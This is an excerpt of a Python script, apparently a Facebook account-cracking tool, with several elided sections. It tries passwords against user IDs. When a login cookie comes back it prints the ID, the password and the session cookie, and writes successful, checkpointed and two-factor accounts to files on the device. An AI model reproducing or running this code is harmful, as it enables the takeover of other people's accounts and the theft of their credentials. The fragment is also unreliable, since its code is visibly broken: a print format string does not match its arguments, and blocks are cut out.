...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mSOFZY-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mMA RK-CP.txt' %
              (H, P, str(len(cps))))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                os.system("play-audio dapet.mp3")
                print('     \033[1;32m[SILAH-OK] '+uid+' | '+ps+
'\n\033[1;37mCookies :\033[1;34m'+coki+'\033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SILAH-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/MARK-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/MARK-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ SILAH ] [%s] \33[1;97m[OK:- %s CP:- %s]\r'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
